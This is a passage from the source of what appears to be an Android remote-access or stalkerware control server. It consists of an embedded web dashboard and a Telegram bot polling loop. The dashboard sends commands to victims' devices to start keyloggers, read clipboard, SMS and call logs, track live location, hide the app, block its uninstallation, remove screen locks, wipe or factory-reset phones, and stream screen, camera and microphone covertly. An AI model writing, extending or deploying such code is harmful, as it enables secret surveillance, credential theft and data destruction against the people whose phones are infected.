+  4030→  security:{label:'&#x1F512; Security',cmds:['wipe_data','factory_reset','show_app','hide_app','change_passcode','set_pin','remove_pin','enable_biometric','disable_biometric','anti_uninstall_on','anti_uninstall_off','device_admin_status','check_root','set_screen_lock','remove_screen_lock']},
+  4031→  monitor:{label:'&#x1F50D; Monitor',cmds:['keylogger_start','keylogger_stop','get_keylogger','screen_record_start','screen_record_stop','clipboard_monitor_start','clipboard_monitor_stop','get_clipboard_log','wifi_monitor_start','wifi_monitor_stop','app_monitor_start','app_monitor_stop','get_app_log','location_live','location_stop','location_history','geo_add','geo_remove','geo_list','sms_monitor','call_monitor']},
+  4032→  syssettings:{label:'&#x2699;&#xFE0F; System',cmds:['set_language','set_timezone','set_alarm','set_timer','set_reminder','enable_dev_mode','disable_dev_mode','enable_usb_debug','disable_usb_debug','dns_change','proxy_set','apn_settings','nfc_on','nfc_off','auto_update_on','auto_update_off']}
+  4033→};
+  4034→
+  4035→function initCmdTabs(){
+  4036→  var tabs=document.getElementById('cmdTabs');
+  4037→  tabs.innerHTML=Object.keys(CMD_CATEGORIES).map(function(k){return '<button class="tab'+(k==='data'?' active':'')+'" onclick="showCmdCat(\''+k+'\',this)">'+CMD_CATEGORIES[k].label+'</button>';}).join('');
+  4038→  showCmdCat('data');
+  4039→}
+  4040→function showCmdCat(cat,btn){
+  4041→  if(btn){document.querySelectorAll('#cmdTabs .tab').forEach(function(t){t.classList.remove('active');});btn.classList.add('active');}
+  4042→  var grid=document.getElementById('cmdGrid');
+  4043→  grid.innerHTML=CMD_CATEGORIES[cat].cmds.map(function(c){return '<button class="cmd-btn" onclick="sendDeviceCmd(\''+c+'\')">'+c.replace(/_/g,' ')+'</button>';}).join('');
+  4044→}
+  4045→
+  4046→/* ========== Send Commands ========== */
+  4047→async function sendDeviceCmd(cmd){
+  4048→  var devId=document.getElementById('cmdDevice').value;
+  4049→  if(!devId){notify('Select a device','var(--red)');return;}
+  4050→  var r=await api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})});
+  4051→  if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
+  4052→  loadAll();
+  4053→}
+  4054→function sendCmd(cmd){
+  4055→  var devId=document.getElementById('fileDevice').value;
+  4056→  if(!devId){notify('Select a device','var(--red)');return;}
+  4057→  api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(function(r){
+  4058→    if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
+  4059→  });
+  4060→}
+  4061→function sendDataCmd(cmd){
+  4062→  var devId=document.getElementById('dataDevice').value;
+  4063→  if(!devId){notify('Select a device','var(--red)');return;}
+  4064→  api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:'get_'+cmd})}).then(function(r){
+  4065→    if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
+  4066→  });
+  4067→}
+  4068→function sendMonCmd(cmd){
+  4069→  var devId=document.getElementById('monDevice').value;
+  4070→  if(!devId){notify('Select a device','var(--red)');return;}
+  4071→  api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(function(r){
+  4072→    if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
+  4073→  });
+  4074→}
+  4075→
+  4076→/* ========== Command Log Rendering ========== */
+  4077→function cmdItemHtml(c){
+  4078→  var statusClass=c.status==='completed'?'green':c.status==='pending'?'yellow':c.status==='failed'?'red':'blue';
+  4079→  var statusLabel=c.status||'unknown';
+  4080→  var spinnerHtml=c.status==='pending'?' <span class="spinner"></span>':'';
+  4081→  var devName=c.device_id;
+  4082→  var dev=DEVICES.find(function(d){return d.id===c.device_id;});
+  4083→  if(dev)devName=dev.name||dev.id;
+  4084→  var resultId='cmdres_'+(c.id||'').replace(/[^a-zA-Z0-9]/g,'');
+  4085→  var hasResult=c.result&&(typeof c.result==='string'?c.result:JSON.stringify(c.result));
+  4086→  var toggleResult=hasResult?'<button class="btn btn-ghost btn-sm" onclick="toggleCmdResult(\''+resultId+'\')">&#x1F4CB; Toggle Result</button>'+
+  4087→    (hasResult?'<button class="btn btn-ghost btn-sm" onclick="copyCmdResult(\''+resultId+'\')">&#x1F4CB; Copy Result</button>':''):'';
+  4088→  return '<div class="cmd-item" data-id="'+esc(c.id)+'" data-status="'+esc(c.status)+'" data-device="'+esc(c.device_id)+'" data-command="'+esc(c.command)+'">'+
+  4089→    '<div class="cmd-header">'+
+  4090→      '<span class="cmd-cmd">'+esc(c.command)+spinnerHtml+'</span>'+
+  4091→      '<div style="display:flex;align-items:center;gap:6px">'+
+  4092→        toggleResult+
+  4093→        '<span class="badge badge-'+statusClass+'">'+esc(statusLabel)+'</span>'+
+  4094→      '</div>'+
+  4095→    '</div>'+
+  4096→    '<div class="cmd-meta">'+
+  4097→      '<span>&#x1F4F1; '+esc(devName)+'</span>'+
+  4098→      '<span>&#x1F552; '+esc(c.created_at||'-')+'</span>'+
+  4099→      (c.completed_at?'<span>&#x2705; '+esc(c.completed_at)+'</span>':'')+
+  4100→    '</div>'+
+  4101→    (hasResult?'<div class="cmd-result" id="'+resultId+'">'+esc(typeof c.result==='string'?c.result:JSON.stringify(c.result,null,2))+'</div>':'')+
+  4102→  '</div>';
+  4103→}
+  4104→function renderCommandLog(cmds){
+  4105→  var filtered=filterCommandsList(cmds||[]);
+  4106→  var el=document.getElementById('cmdLog');
+  4107→  var dash=document.getElementById('dashCommands');
+  4108→  var items=filtered.slice(-30).reverse();
+  4109→  if(!items.length){el.innerHTML='<div class="empty"><div class="empty-icon">&#x1F4CB;</div>No commands</div>';dash.innerHTML='';return;}
+  4110→  var html=items.map(cmdItemHtml).join('');
+  4111→  el.innerHTML=html;
+  4112→  dash.innerHTML=items.slice(0,8).map(cmdItemHtml).join('');
+  4113→}
+  4114→function filterCommandLog(){renderCommandLog(ALL_COMMANDS);}
+  4115→function filterCommandsList(cmds){
+  4116→  var statusF=document.getElementById('cmdStatusFilter').value;
+  4117→  var q=(document.getElementById('cmdSearchInput').value||'').toLowerCase();
+  4118→  return cmds.filter(function(c){
+  4119→    if(statusF!=='all'&&c.status!==statusF)return false;
+  4120→    if(q){
+  4121→      var text=(c.command+' '+c.device_id+' '+(c.result||'')).toLowerCase();
+  4122→      if(text.indexOf(q)<0)return false;
+  4123→    }
+  4124→    return true;
+  4125→  });
+  4126→}
+  4127→function toggleCmdResult(id){
+  4128→  var el=document.getElementById(id);
+  4129→  if(el)el.classList.toggle('expanded');
+  4130→}
+  4131→function copyCmdResult(id){
+  4132→  var el=document.getElementById(id);
+  4133→  if(!el)return;
+  4134→  navigator.clipboard.writeText(el.textContent).then(function(){notify('Copied to clipboard!');}).catch(function(){notify('Copy failed','var(--red)');});
+  4135→}
+  4136→function checkPendingRefresh(){
+  4137→  var hasPending=ALL_COMMANDS.some(function(c){return c.status==='pending';});
+  4138→  if(hasPending&&!PENDING_REFRESH){
+  4139→    PENDING_REFRESH=setInterval(function(){
+  4140→      var still=ALL_COMMANDS.some(function(c){return c.status==='pending';});
+  4141→      if(!still){clearInterval(PENDING_REFRESH);PENDING_REFRESH=null;return;}
+  4142→      api('web/commands').then(function(r){if(r.ok){ALL_COMMANDS=r.commands||[];renderCommandLog(ALL_COMMANDS);}});
+  4143→    },3000);
+  4144→  }
+  4145→}
+  4146→
+  4147→/* ========== Event Log ========== */
+  4148→async function loadEvents(){
+  4149→  var r=await api('web/events');
+  4150→  if(r.ok){
+  4151→    ALL_EVENTS=r.events||[];
+  4152→    renderEventLog(ALL_EVENTS);
+  4153→    populateEventDeviceFilter();
+  4154→  }
+  4155→}
+  4156→function eventLevelClass(level){
+  4157→  if(level==='security'||level==='error'||level==='danger')return 'security';
+  4158→  if(level==='warning')return 'warning';
+  4159→  if(level==='success')return 'success';
+  4160→  return 'info';
+  4161→}
+  4162→function renderEventLog(events){
+  4163→  var filtered=filterEventsList(events||[]);
+  4164→  var tbody=document.getElementById('eventLogBody');
+  4165→  var emptyEl=document.getElementById('eventLogEmpty');
+  4166→  if(!filtered.length){tbody.innerHTML='';emptyEl.style.display='';return;}
+  4167→  emptyEl.style.display='none';
+  4168→  tbody.innerHTML=filtered.reverse().map(function(e){
+  4169→    var level=e.level||'info';
+  4170→    var cls=eventLevelClass(level);
+  4171→    var devName=esc(e.details&&e.details.id?e.details.id:'-');
+  4172→    if(e.details&&e.details.name)devName=esc(e.details.name);
+  4173→    var detailsStr='';
+  4174→    if(e.details){
+  4175→      try{detailsStr=JSON.stringify(e.details).slice(0,120);}catch(ex){detailsStr=String(e.details).slice(0,120);}
+  4176→    }
+  4177→    return '<tr class="event-item">'+
+  4178→      '<td class="ev-time">'+esc((e.time||'').slice(0,19))+'</td>'+
+  4179→      '<td class="ev-device">'+devName+'</td>'+
+  4180→      '<td><span class="ev-type '+cls+'">'+esc(level)+'</span></td>'+
+  4181→      '<td>'+esc(e.event||'')+'</td>'+
+  4182→      '<td style="color:var(--text-muted);font-size:11px">'+esc(detailsStr)+'</td>'+
+  4183→    '</tr>';
+  4184→  }).join('');
+  4185→  if(document.getElementById('eventAutoScroll').checked){
+  4186→    var wrap=tbody.closest('.table-wrap');
+  4187→    if(wrap)wrap.scrollTop=wrap.scrollHeight;
+  4188→  }
+  4189→}
+  4190→function filterEventLog(){renderEventLog(ALL_EVENTS);}
+  4191→function filterEventsList(events){
+  4192→  var devF=document.getElementById('eventDeviceFilter').value;
+  4193→  var typeF=document.getElementById('eventTypeFilter').value;
+  4194→  var dateF=document.getElementById('eventDateFilter').value;
+  4195→  return events.filter(function(e){
+  4196→    if(devF!=='all'){
+  4197→      if(e.details&&e.details.id&&e.details.id!==devF)return false;
+  4198→      if(!e.details||!e.details.id)return false;
+  4199→    }
+  4200→    if(typeF!=='all'){
+  4201→      var cls=eventLevelClass(e.level||'info');
+  4202→      if(cls!==typeF)return false;
+  4203→    }
+  4204→    if(dateF&&(e.time||'').slice(0,10)!==dateF)return false;
+  4205→    return true;
+  4206→  });
+  4207→}
+  4208→
+  4209→/* ========== Settings ========== */
+  4210→async function loadSettings(){
+  4211→  var r=await api('web/settings');
+  4212→  if(r.ok){
+  4213→    var s=r.settings;
+  4214→    document.getElementById('settingsForm').innerHTML=
+  4215→      '<label style="display:block;margin-bottom:12px">&#x1F511; Admin Password<input id="setPass" value="'+esc(s.admin_password||'admin')+'" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"></label>'+
+  4216→      '<label style="display:block;margin-bottom:12px">&#x23F1; Sync Interval (sec)<input id="setSync" type="number" value="'+esc(s.sync_interval||300)+'" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"></label>'+
+  4217→      '<label style="display:block;margin-bottom:12px">&#x1F4CD; Location Interval (sec)<input id="setLoc" type="number" value="'+esc(s.location_interval||60)+'" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"></label>'+
+  4218→      '<label style="display:block;margin-bottom:12px">&#x1F310; Language<select id="setLang" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"><option value="ar" '+(s.language==='ar'?'selected':'')+'>Arabic</option><option value="en" '+(s.language==='en'?'selected':'')+'>English</option></select></label>'+
+  4219→      '<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setNotif" '+(s.notifications?'checked':'')+'> &#x1F514; Notifications</label>'+
+  4220→      '<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoLoc" '+(s.auto_location?'checked':'')+'> &#x1F5FA;&#xFE0F; Auto Location</label>'+
+  4221→      '<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoSync" '+(s.auto_sync?'checked':'')+'> &#x1F504; Auto Sync</label>';
+  4222→  }
+  4223→}
+  4224→async function saveSettings(){
+  4225→  var data={
+  4226→    admin_password:document.getElementById('setPass').value,
+  4227→    sync_interval:parseInt(document.getElementById('setSync').value),
+  4228→    location_interval:parseInt(document.getElementById('setLoc').value),
+  4229→    language:document.getElementById('setLang').value,
+  4230→    notifications:document.getElementById('setNotif').checked,
+  4231→    auto_location:document.getElementById('setAutoLoc').checked,
+  4232→    auto_sync:document.getElementById('setAutoSync').checked,
+  4233→  };
+  4234→  var r=await api('web/settings',{method:'PUT',body:JSON.stringify(data)});
+  4235→  if(r.ok)notify('Settings saved!');else notify('Failed','var(--red)');
+  4236→}
+  4237→
+  4238→/* ========== Init ========== */
+  4239→if(TOKEN){showApp();}
+  4240→initCmdTabs();
+  4241→setTimeout(loadSettings,500);
+  4242→
+  4243→/* ========== LIVE STREAMING (JPEG Screenshot-based) ========== */
+  4244→var _streamType='screen';
+  4245→var _streamActive=false;
+  4246→var _streamPollTimer=null;
+  4247→var _frameCount=0;
+  4248→var _audioAnimFrame=null;
+  4249→var _streamWaitingTimer=null;
+  4250→var _firstFrameReceived=false;
+  4251→var _lastFrameData='';
+  4252→var _streamQuality=3;
+  4253→
+  4254→function onStreamDeviceChange(){
+  4255→  var devId=document.getElementById('streamDevice').value;
+  4256→  document.getElementById('stDevice').textContent=devId?((DEVICES.find(function(d){return d.id===devId;})||{}).name||devId):'-';
+  4257→  if(_streamActive)stopStream();
+  4258→}
+  4259→function selectStreamType(type){
+  4260→  _streamType=type;
+  4261→  document.querySelectorAll('.stream-type-btn').forEach(function(b){b.classList.remove('active');});
+  4262→  var btnId=type==='screen'?'stScreen':type==='camera'?'stCamera':'stAudio';
+  4263→  document.getElementById(btnId).classList.add('active');
+  4264→  document.getElementById('qualityCard').style.display=type==='audio'?'none':'block';
+  4265→}
+  4266→function setQuality(q,btn){
+  4267→  _streamQuality={'low':8,'medium':3,'high':1}[q]||3;
+  4268→  document.querySelectorAll('.stream-quality button').forEach(function(b){b.classList.remove('active');});
+  4269→  btn.classList.add('active');
+  4270→  notify('Quality changed');
+  4271→}
+  4272→function _setViewerState(state){
+  4273→  var viewer=document.getElementById('streamViewer');
+  4274→  var noMsg=document.getElementById('noStreamMsg');
+  4275→  var img=document.getElementById('streamImg');
+  4276→  var badge=document.getElementById('streamBadge');
+  4277→  var audioC=document.getElementById('audioPlayerContainer');
+  4278→  noMsg.style.display='none';img.style.display='none';badge.style.display='none';audioC.style.display='none';viewer.style.background='#000';
+  4279→  if(state==='idle'){noMsg.style.display='';noMsg.innerHTML='<div style="font-size:48px;margin-bottom:12px">&#x1F4E1;</div>Select a device and start streaming';viewer.style.background='var(--surface)';}
+  4280→  else if(state==='waiting'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div class="pulse" style="font-size:48px;margin-bottom:16px">&#x231B;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px">Waiting for device frame...</div><div style="color:var(--text-secondary);font-size:13px">Sending screenshot command to device.<br>First frame may take a few seconds.<br>Ensure device is connected and screen capture permission is granted.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--yellow)">&#x25CF; Waiting...</span>';}
+  4281→  else if(state==='connected'){document.getElementById('stStatus').innerHTML='<span style="color:var(--blue)">&#x25CF; Connected - waiting for frame...</span>';}
+  4282→  else if(state==='receiving_video'){img.style.display='';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">&#x25CF; Live</span>';}
+  4283→  else if(state==='receiving_audio'){audioC.style.display='block';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">&#x25CF; Live</span>';}
+  4284→  else if(state==='error'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div style="font-size:48px;margin-bottom:16px">&#x26A0;&#xFE0F;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px;color:var(--accent)">Stream failed</div><div style="color:var(--text-secondary);font-size:13px">Make sure the device is connected.<br>Ensure screen capture permission is granted.<br>Try again.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--accent)">&#x25CF; Failed</span>';}
+  4285→}
+  4286→async function startStream(){
+  4287→  var devId=document.getElementById('streamDevice').value;
+  4288→  if(!devId){notify('Select a device first','var(--red)');return;}
+  4289→  _streamActive=true;_frameCount=0;_firstFrameReceived=false;_lastFrameData='';
+  4290→  document.getElementById('btnStartStream').style.display='none';
+  4291→  document.getElementById('btnStopStream').style.display='';
+  4292→  document.getElementById('btnSwitchCam').style.display=_streamType==='camera'?'':'none';
+  4293→  document.getElementById('stFrames').textContent='0';
+  4294→  document.getElementById('stLastAct').textContent='-';
+  4295→  var typeLabel=_streamType==='screen'?'Screen':_streamType==='camera'?'Camera':'Audio';
+  4296→  document.getElementById('stType').textContent=typeLabel;
+  4297→  var dev=DEVICES.find(function(d){return d.id===devId;});
+  4298→  document.getElementById('stDevice').textContent=(dev&&dev.name)||devId;
+  4299→  _setViewerState('waiting');
+  4300→  notify('Starting stream: '+typeLabel);
+  4301→  var interval=_streamType==='audio'?5:_streamQuality;
+  4302→  var r=await api('stream/jpeg_start',{method:'POST',body:JSON.stringify({device_id:devId,type:_streamType,interval:interval})});
+  4303→  if(!r.ok){notify('Stream start failed: '+(r.error||''),'var(--red)');_setViewerState('error');_streamActive=false;document.getElementById('btnStartStream').style.display='';document.getElementById('btnStopStream').style.display='none';return;}
+  4304→  notify('Stream started - waiting for first frame...');
+  4305→  startStreamPolling(devId);
+  4306→  if(_streamWaitingTimer)clearTimeout(_streamWaitingTimer);
+  4307→  _streamWaitingTimer=setTimeout(function(){if(_streamActive&&!_firstFrameReceived){_setViewerState('error');}},60000);
+  4308→}
+  4309→async function stopStream(){
+  4310→  var devId=document.getElementById('streamDevice').value;
+  4311→  if(!devId)return;
+  4312→  api('stream/jpeg_stop',{method:'POST',body:JSON.stringify({device_id:devId})});
+  4313→  _cleanupStream();
+  4314→  notify('Stream stopped');
+  4315→}
+  4316→function _cleanupStream(){
+  4317→  _streamActive=false;_firstFrameReceived=false;_lastFrameData='';
+  4318→  if(_streamPollTimer){clearInterval(_streamPollTimer);_streamPollTimer=null;}
+  4319→  if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}
+  4320→  if(_audioAnimFrame){cancelAnimationFrame(_audioAnimFrame);_audioAnimFrame=null;}
+  4321→  document.getElementById('btnStartStream').style.display='';
+  4322→  document.getElementById('btnStopStream').style.display='none';
+  4323→  document.getElementById('btnSwitchCam').style.display='none';
+  4324→  _setViewerState('idle');
+  4325→  document.getElementById('stStatus').textContent='Stopped';
+  4326→}
+  4327→async function switchCamera(){
+  4328→  var devId=document.getElementById('streamDevice').value;
+  4329→  if(!devId)return;
+  4330→  if(_streamType==='front_camera')_streamType='back_camera';
+  4331→  else if(_streamType==='back_camera')_streamType='front_camera';
+  4332→  else _streamType='camera';
+  4333→  if(_streamActive){stopStream();setTimeout(function(){startStream();},500);}
+  4334→  else{startStream();}
+  4335→  notify('Camera switched');
+  4336→}
+  4337→function _onFrameReceived(base64Data,isAudio){
+  4338→  if(base64Data===_lastFrameData)return;
+  4339→  _lastFrameData=base64Data;
+  4340→  if(!_firstFrameReceived){_firstFrameReceived=true;if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}}
+  4341→  _frameCount++;
+  4342→  document.getElementById('stFrames').textContent=_frameCount;
+  4343→  document.getElementById('stLastAct').textContent=new Date().toLocaleTimeString();
+  4344→  if(isAudio){_setViewerState('receiving_audio');}
+  4345→  else{_setViewerState('receiving_video');document.getElementById('streamImg').src='data:image/jpeg;base64,'+base64Data;}
+  4346→}
+  4347→function startStreamPolling(devId){
+  4348→  if(_streamPollTimer)clearInterval(_streamPollTimer);
+  4349→  _streamPollTimer=setInterval(async function(){
+  4350→    if(!_streamActive)return;
+  4351→    try{
+  4352→      var typeParam=_streamType==='audio'?'audio':'video';
+  4353→      var resp=await fetch('/api/stream/frame/'+devId+'?type='+typeParam,{headers:{'Authorization':'Bearer '+TOKEN}});
+  4354→      var r=await resp.json();
+  4355→      if(r.ok&&r.data&&r.data.length>50){_onFrameReceived(r.data,false);}
+  4356→      else if(r.ok&&_firstFrameReceived){}
+  4357→      else if(!_firstFrameReceived){
+  4358→        try{var sr=await fetch('/api/stream/status',{headers:{'Authorization':'Bearer '+TOKEN}});var status=await sr.json();if(status.ok&&status.active_streams&&status.active_streams[devId]){if(!_firstFrameReceived)_setViewerState('connected');}else if(!_firstFrameReceived&&_streamActive){_setViewerState('waiting');}}catch(e){}
+  4359→      }
+  4360→    }catch(e){}
+  4361→  },2000);
+  4362→}
+  4363→
+  4364→// Add streaming category to commands
+  4365→CMD_CATEGORIES.streaming={label:'&#x1F4E1; Streaming',cmds:['start_screen_stream','stop_screen_stream','start_camera_stream','stop_camera_stream','switch_camera','start_audio_stream','stop_audio_stream','get_stream_status','set_stream_quality','enable_torch','pause_stream','resume_stream','stop_all_streams','get_stream_capabilities']};
+  4366→if(document.getElementById('cmdTabs')){
+  4367→  var tabs=document.getElementById('cmdTabs');
+  4368→  if(tabs.innerHTML.indexOf('Streaming')===-1){
+  4369→    tabs.innerHTML+='<button class="tab" onclick="showCmdCat(\'streaming\',this)">&#x1F4E1; Streaming</button>';
+  4370→  }
+  4371→}
+  4372→</script>
+  4373→</body>
+  4374→</html>"""
+  4375→
+  4376→# ============================================================================
+  4377→# WEB DASHBOARD ROUTE
+  4378→# ============================================================================
+  4379→
+  4380→async def serve_dashboard(request):
+  4381→    return web.Response(text=DASHBOARD_HTML, content_type="text/html", charset="utf-8")
+  4382→
+  4383→# ============================================================================
+  4384→# GETUPDATES POLLING
+  4385→# ============================================================================
+  4386→
+  4387→async def tg_poll_loop():
+  4388→    global tg_offset, polling_active, _processed_update_ids, _processed_message_keys, _message_dedup, _chat_rate_counter, _data_forward_dedup
+  4389→    polling_active = True
+  4390→    
+  4391→    # === تنظيف الاتصالات القديمة عند بدء التشغيل ===
+  4392→    log.info("Cleaning old connections (deleteWebhook)...")
+  4393→    try:
+  4394→        session = get_tg_session()
+  4395→        # حذف webhook وتجاهل التحديثات المعلقة
+  4396→        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true") as resp:
+  4397→            r = await resp.json()
+  4398→            log.info("deleteWebhook: %s", r.get("description", r.get("ok")))
+  4399→        await asyncio.sleep(1)
+  4400→        # التحقق من البوت
+  4401→        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe") as resp:
+  4402→            me = await resp.json()
+  4403→            if me.get("ok"):
+  4404→                log.info("Bot connected: @%s (%s)", me["result"].get("username", "?"), me["result"].get("first_name", "?"))
+  4405→            else:
+  4406→                log.warning("getMe failed: %s", me)
+  4407→        await asyncio.sleep(1)
+  4408→    except Exception as exc:
+  4409→        log.warning("Connection cleanup: %s", exc)
+  4410→    
+  4411→    log.info("Starting Telegram getUpdates polling...")
+  4412→    
+  4413→    _conflict_count = 0
+  4414→    while polling_active:
+  4415→        try:
+  4416→            payload = {
+  4417→                "offset": tg_offset,
+  4418→                "timeout": 30,
+  4419→                "allowed_updates": ["message", "callback_query"],
+  4420→            }
+  4421→            result = await tg_request("getUpdates", payload)
+  4422→            if not result or not result.get("ok"):
+  4423→                desc = (result or {}).get("description", "")
+  4424→                if "Conflict" in desc:
+  4425→                    _conflict_count += 1
+  4426→                    log.warning("Conflict detected (%d), waiting...", _conflict_count)
+  4427→                    await asyncio.sleep(8)
+  4428→                else:
+  4429→                    await asyncio.sleep(2)
+  4430→                continue
+  4431→            _conflict_count = 0  # إعادة العداد عند النجاح
+  4432→            
+  4433→            # Periodic cleanup (every 100 polls)
+  4434→            if not hasattr(tg_poll_loop, '_poll_count'):
+  4435→                tg_poll_loop._poll_count = 0
+  4436→            tg_poll_loop._poll_count += 1
+  4437→            if tg_poll_loop._poll_count % 100 == 0:
+  4438→                now = time.time()
+  4439→                _message_dedup = {k: v for k, v in _message_dedup.items() if now - v > 600}
+  4440→                _chat_rate_counter = {k: v for k, v in _chat_rate_counter.items() if v and now - v[-1] > 300}
+  4441→                _data_forward_dedup = {k: v for k, v in _data_forward_dedup.items() if now - v > 300}
+  4442→            
+  4443→            updates = result.get("result", [])
+  4444→            for update in updates:
+  4445→                update_id = update.get("update_id", 0)
+  4446→                tg_offset = update_id + 1
+  4447→                
+  4448→                # === منع تكرار معالجة نفس التحديث ===
+  4449→                if update_id in _processed_update_ids:
+  4450→                    continue
+  4451→                _processed_update_ids.add(update_id)
+  4452→                if len(_processed_update_ids) > 1000:
+  4453→                    _processed_update_ids = set(list(_processed_update_ids)[-500:])
+  4454→                
+  4455→                # Handle message
+  4456→                if "message" in update:
+  4457→                    msg = update["message"]
+  4458→                    chat_id = msg.get("chat", {}).get("id")
+  4459→                    text = msg.get("text", "")
+  4460→                    msg_id = msg.get("message_id", 0)
+  4461→                    
+  4462→                    # === منع تكرار معالجة نفس الرسالة بالضبط ===
+  4463→                    msg_key = f"{chat_id}:{msg_id}"
+  4464→                    if msg_key in _processed_message_keys:
+  4465→                        continue
+  4466→                    _processed_message_keys.add(msg_key)
+  4467→                    if len(_processed_message_keys) > 500:
+  4468→                        _processed_message_keys = set(list(_processed_message_keys)[-200:])
+  4469→                    
+  4470→                    if chat_id != ADMIN_CHAT_ID:
+  4471→                        log.warning("Unauthorized access from %s", chat_id)
+  4472→                        continue
+  4473→                    
+  4474→                    if text.startswith("/"):
+  4475→                        await handle_telegram_command(chat_id, text, msg_id)
+  4476→                
+  4477→                # Handle callback query
+  4478→                if "callback_query" in update:
+  4479→                    cb = update["callback_query"]
+  4480→                    cb_id = cb.get("id", "")
+  4481→                    cb_chat = cb.get("message", {}).get("chat", {}).get("id")
+  4482→                    
+  4483→                    # === منع تكرار معالجة نفس الـ callback ===
+  4484→                    cb_key = f"cb:{cb_id}"
+  4485→                    if cb_key in _processed_message_keys:
+  4486→                        continue
+  4487→                    _processed_message_keys.add(cb_key)
+  4488→                    
+  4489→                    if cb_chat != ADMIN_CHAT_ID:
+  4490→                        continue
+  4491→                    await handle_callback_query(cb)
+  4492→        
+  4493→        except asyncio.CancelledError:
+  4494→            break
+  4495→        except Exception as exc:
+  4496→            log.error("Poll error: %s", exc)
+  4497→            await asyncio.sleep(3)
+  4498→
+  4499→# ============================================================================
+
+[showing lines 3500-4499 of 5555; use offset=4500 with limit to continue reading]
